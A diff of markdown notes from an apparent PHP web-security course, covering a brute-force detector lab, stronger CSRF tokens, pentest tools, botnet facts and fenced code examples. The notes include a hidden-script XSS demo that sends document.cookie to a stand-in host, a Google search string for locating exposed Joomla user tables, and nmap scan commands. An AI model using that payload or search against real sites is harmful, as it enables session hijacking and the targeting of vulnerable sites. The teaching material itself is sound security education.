@@ -7,75 +7,6 @@
 * http://www.thamesriverservices.co.uk/timetable_winter.cfm
 * Websites still infected!!!  From Google type this: inurl:"jos_users" inurl:"index.php"
 
-## Q & A
-* Q: Brute force detector lab setup?
-* A: Need to create a table "bfdetect"
-```
-CREATE TABLE `bfdetect` (
-  `id` bigint(3) unsigned NOT NULL auto_increment,
-  `today` varchar(20) NOT NULL,
-  `minute` varchar(3) NOT NULL,
-  `ip` varchar(16) NOT NULL,
-  `forward_ip` varchar(500) NOT NULL,
-  `useragent` varchar(100) NOT NULL,
-  `userlan` varchar(100) NOT NULL,
-  `isnotify` char(1) default '0',
-  `notify4today` char(1) default '0',
-  PRIMARY KEY  (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
-   (Look in /securitytraining/data/sql/course.sql
-. Based on the config, found in the securitytraining app config under the 'bfdetect' key, the detector checks the table for previous requests from the various $_SERVER params and logs the request. After four (config) requests are made from the same $_SERVER params within a 5 minute (config) setting, a log entry is created and a response to the attacker is slowed with a sleep option. In order for this script to work, you have to log more than 4 requests in 5 minutes in order for the log entry and sleep response. I decided not to populate the data due to this timing requirement which is based on the current server time.
-```
-[8:55:55 PM] Daryl Wood: You can populate the table with four quick CLI executions, then run the fifth from the securitytraining brute force page with the login. I just noticed the SQL table is not in the VM version. Oops , sorry for that, will fix this.
-[9:00:00 PM] Daryl Wood: Just fixed the VM to include the bfdetect table. In the mean time, have your students load the table create SQL from the dump, and you should be able to run the BF tool.
-
-
-* Q: The example in the slides discussing CSRF has this code:
-   $token = md5 ( uniqid ( rand (), TRUE ) );
-   But I understand md5() is not strong.  Do you have any other suggestions?
-* A: md5() can indeed be cracked by hacking tools such as hashcat.
-   md5() is useful when you need to generate a quick hash but where it's not important if somebody can reverse it.
-   For example, it might be useful to produce a key from an uploaded image filename which is used for internal storage.
-   md5() will do that for you quickly.  For anything which "goes public" however it's best to use something stronger.
-   If you look at http://php.net/uniqid you will see that it does not produce a cryptographically secure id.
-   The same is true of the rand() function: over several iterations its output becomes predictable, which
-   brute force tools latch onto and make it easier to crack a hash based on such values.
-   password_hash('text', PASSWORD_BCRYPT) will produce a BCRYPT hash which is much stronger and harder to break.
-   If you have OpenSSL installed + the PHP OpenSSL extension enabled, you can use openssl_random_pseudo_bytes().
-   PHP 7 introduced two CSPRNG functions: random_int() and random_bytes() which use randomization available from the OS
-   which in turn uses hardware.  Here is a potential replacement for the statement given in the question:
-   $token = bin2hex(random_bytes(32));
-
-* Q: RE: memory + post limits in php.ini
-* A:  upload_max_filesize < post_max_size <  memory_limit
-
-* Q: Suggestions on penetration testing tools, esp. PHP?
-* A:
-  * MetaSploit
-  * Nessus
-  * Snort.org
-  * Owasp.org tools page
-
-* Q: Fingerprinting suggestions?
-* A: https://github.com/Valve/fingerprintjs2
-
-* Q: What is a botnet?
-* A: A network of slaved computers infected with controlling malware.
-   See: https://en.wikipedia.org/wiki/Botnet
-
-* Q: How large can a botnet become?
-* A: The largest botnets detected in 2015 were the following:
-   Ramnit: 3,000,000 computers
-   Zeus: 3,600,000 computers
-   TDL4: 4,500,000 computers
-   ZeroAccess: 1,900,000 computers
-   Storm: 250,000 to 50,000,000 computers
-   Cutwail: 2,000,000 computers
-   Conficker: at its peak in 2009 3,000,000 to 4,000,000 computers
-   Windigo: 10,000 Linux servers (!!!)
-   See: https://www.welivesecurity.com/2015/02/25/nine-bad-botnets-damage/
-   See: https://en.wikipedia.org/wiki/Botnet
-
 * DEMO: nmap -A -T4 ip.add.re.ss
 
 ## SQL Injection Suggested Protection:
@@ -108,7 +39,7 @@ CREATE TABLE `bfdetect` (
     UNLESS: if you're implementing a CMS, don't strip all tags (used 2nd param of strip_tags())
     Only allow certain ones
     Consider using Zend\Filter\StripTags which can also filter out selected attribs
-    strip_tags('<b onclick="javascript:alert("test")">', '<b>');
+    `strip_tags('<b onclick="javascript:alert("test")">', '<b>');`
     would still execute the javascript
 * 5: Control the length of your input data
 * 6: For CMS implementation, consider using other libraries
@@ -550,22 +481,90 @@ DEMO: nmap -A -T4 172.16.82.1
 DEMO: wireshark packet capture
 DEMO: logwatch
 
-IE Tools:
-http://portswigger.net/burp/proxy.html
-http://blogs.msdn.com/b/ie/archive/2008/09/03/developer-tools-in-internet-explorer-8-beta-2.aspx
-http://msdn.microsoft.com/en-us/ie/aa740478
+* IE Tools:
+  * http://portswigger.net/burp/proxy.html
+  * http://blogs.msdn.com/b/ie/archive/2008/09/03/developer-tools-in-internet-explorer-8-beta-2.aspx
+  * http://msdn.microsoft.com/en-us/ie/aa740478
 
-Chrome:
-http://code.google.com/chrome/devtools/docs/overview.html
+* Chrome:
+  * http://code.google.com/chrome/devtools/docs/overview.html
 
-Encryption:
-REF: http://www.zend.com/en/webinar/PHP/70170000000bWL2-strong-cryptographie-20110630.flv
+* Encryption:
+  * REF: http://www.zend.com/en/webinar/PHP/70170000000bWL2-strong-cryptographie-20110630.flv
 
 After module 4, use the VM to figure out where insecurities lie
 Are your cookies really safe?<div style="visibility:hidden;"><img name="x" src="default.png"><script>document.x.src="http://paypal.hack/logger.php?info="+document.cookie;alert("I guess not!");</script></div>
 
 
-Q & A:
+## Q & A
+* Q: Brute force detector lab setup?
+* A: Need to create a table "bfdetect"
+```
+CREATE TABLE `bfdetect` (
+  `id` bigint(3) unsigned NOT NULL auto_increment,
+  `today` varchar(20) NOT NULL,
+  `minute` varchar(3) NOT NULL,
+  `ip` varchar(16) NOT NULL,
+  `forward_ip` varchar(500) NOT NULL,
+  `useragent` varchar(100) NOT NULL,
+  `userlan` varchar(100) NOT NULL,
+  `isnotify` char(1) default '0',
+  `notify4today` char(1) default '0',
+  PRIMARY KEY  (`id`)
+) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+   (Look in /securitytraining/data/sql/course.sql
+. Based on the config, found in the securitytraining app config under the 'bfdetect' key, the detector checks the table for previous requests from the various $_SERVER params and logs the request. After four (config) requests are made from the same $_SERVER params within a 5 minute (config) setting, a log entry is created and a response to the attacker is slowed with a sleep option. In order for this script to work, you have to log more than 4 requests in 5 minutes in order for the log entry and sleep response. I decided not to populate the data due to this timing requirement which is based on the current server time.
+```
+[8:55:55 PM] Daryl Wood: You can populate the table with four quick CLI executions, then run the fifth from the securitytraining brute force page with the login. I just noticed the SQL table is not in the VM version. Oops , sorry for that, will fix this.
+[9:00:00 PM] Daryl Wood: Just fixed the VM to include the bfdetect table. In the mean time, have your students load the table create SQL from the dump, and you should be able to run the BF tool.
+
+
+* Q: The example in the slides discussing CSRF has this code:
+   $token = md5 ( uniqid ( rand (), TRUE ) );
+   But I understand md5() is not strong.  Do you have any other suggestions?
+* A: md5() can indeed be cracked by hacking tools such as hashcat.
+   md5() is useful when you need to generate a quick hash but where it's not important if somebody can reverse it.
+   For example, it might be useful to produce a key from an uploaded image filename which is used for internal storage.
+   md5() will do that for you quickly.  For anything which "goes public" however it's best to use something stronger.
+   If you look at http://php.net/uniqid you will see that it does not produce a cryptographically secure id.
+   The same is true of the rand() function: over several iterations its output becomes predictable, which
+   brute force tools latch onto and make it easier to crack a hash based on such values.
+   password_hash('text', PASSWORD_BCRYPT) will produce a BCRYPT hash which is much stronger and harder to break.
+   If you have OpenSSL installed + the PHP OpenSSL extension enabled, you can use openssl_random_pseudo_bytes().
+   PHP 7 introduced two CSPRNG functions: random_int() and random_bytes() which use randomization available from the OS
+   which in turn uses hardware.  Here is a potential replacement for the statement given in the question:
+   $token = bin2hex(random_bytes(32));
+
+* Q: RE: memory + post limits in php.ini
+* A:  upload_max_filesize < post_max_size <  memory_limit
+
+* Q: Suggestions on penetration testing tools, esp. PHP?
+* A:
+  * MetaSploit
+  * Nessus
+  * Snort.org
+  * Owasp.org tools page
+
+* Q: Fingerprinting suggestions?
+* A: https://github.com/Valve/fingerprintjs2
+
+* Q: What is a botnet?
+* A: A network of slaved computers infected with controlling malware.
+   See: https://en.wikipedia.org/wiki/Botnet
+
+* Q: How large can a botnet become?
+* A: The largest botnets detected in 2015 were the following:
+   Ramnit: 3,000,000 computers
+   Zeus: 3,600,000 computers
+   TDL4: 4,500,000 computers
+   ZeroAccess: 1,900,000 computers
+   Storm: 250,000 to 50,000,000 computers
+   Cutwail: 2,000,000 computers
+   Conficker: at its peak in 2009 3,000,000 to 4,000,000 computers
+   Windigo: 10,000 Linux servers (!!!)
+   See: https://www.welivesecurity.com/2015/02/25/nine-bad-botnets-damage/
+   See: https://en.wikipedia.org/wiki/Botnet
+
 
 * Q: Can you address how to protect from hacked images like that jpeg?
 * A: jpegs infected with a virus are not a danger unless they area "executed" directly by the OS.
@@ -573,8 +572,9 @@ Q & A:
    See: http://www.symantec.com/security_response/writeup.jsp?docid=2002-061310-4234-99
    Recommendation: train users *not* to open suspicious attachments (which is the usual form of delivery)
 
-CLASS CODE EXAMPLES
+## CLASS CODE EXAMPLES
 
+```
 // xss stored solution
 <?php
 
@@ -606,7 +606,9 @@ if(isset($_POST['btnSign']))
       echo 'No results found';
    }
 }
+```
 
+```
 // CSRF solution
 <?php
 /**
@@ -690,7 +692,9 @@ if (isset($_POST['Change'])) {
             <br /><br /><input type=\"submit\" value=\"Change\" name=\"Change\">
         </form>";
 }
+```
 
+```
 // insecure configuration lab
 <?php
 
@@ -738,7 +742,9 @@ if (!empty($_POST['username']) && !empty($_POST['password'])) {
           </div>
          </div>";
 }
+```
 
+```
 // secure file upload
 <?php
 // TODO: redefine / override the php.ini setting for tmp files
@@ -835,7 +841,4 @@ phpinfo(INFO_VARIABLES);
 ?>
 </body>
 </html>
-
-
-
-
+```
